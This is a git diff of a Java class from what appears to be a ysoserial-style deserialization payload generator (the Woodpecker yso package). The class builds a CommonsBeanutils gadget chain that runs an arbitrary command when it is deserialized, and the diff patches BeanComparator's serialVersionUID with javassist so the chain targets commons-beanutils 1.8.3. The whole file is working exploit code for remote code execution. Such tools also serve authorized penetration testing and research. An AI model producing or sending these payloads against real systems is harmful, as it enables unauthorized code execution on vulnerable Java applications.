@@ -1,8 +1,7 @@
 package me.gv7.woodpecker.yso.payloads;
 
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtField;
+import javassist.*;
+import me.gv7.woodpecker.yso.JavassistClassLoader;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
 import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
 import me.gv7.woodpecker.yso.payloads.util.Gadgets;
@@ -10,6 +9,9 @@ import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
 import me.gv7.woodpecker.yso.payloads.util.Reflections;
 import org.apache.commons.beanutils.BeanComparator;
 
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.util.Comparator;
 import java.util.PriorityQueue;
 
 import static me.gv7.woodpecker.yso.payloads.util.Reflections.setFieldValue;
@@ -22,10 +24,18 @@ public class CommonsBeanutils2_183 implements ObjectPayload<Object>  {
     @Override
     public Object getObject(String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
+        // 修改BeanComparator类的serialVersionUID
+        ClassPool pool = ClassPool.getDefault();
+        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
+        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
+        ctBeanComparator.defrost();
+        try {
+            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
+            ctBeanComparator.removeField(ctSUID);
+        }catch (javassist.NotFoundException e){}
+        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
 
-        final CtClass value = ClassPool.getDefault().get("org.apache.commons.beanutils.BeanComparator");
-        value.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", value));
-        final BeanComparator comparator = (BeanComparator) value.toClass().newInstance();
+        final Comparator comparator = (Comparator) ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
         Reflections.setFieldValue(comparator, "property", null);
         Reflections.setFieldValue(comparator,"comparator",String.CASE_INSENSITIVE_ORDER);
 
@@ -36,12 +46,11 @@ public class CommonsBeanutils2_183 implements ObjectPayload<Object>  {
 
         setFieldValue(comparator, "property", "outputProperties");
         setFieldValue(queue, "queue", new Object[]{templates, templates});
-
+        ctBeanComparator.defrost();
         return queue;
     }
 
     public static void main(final String[] args) throws Exception {
-        //PayloadRunner.run(CommonsBeanutils2_183.class, args);
-
+        PayloadRunner.run(CommonsBeanutils2_183.class, args);
     }
 }
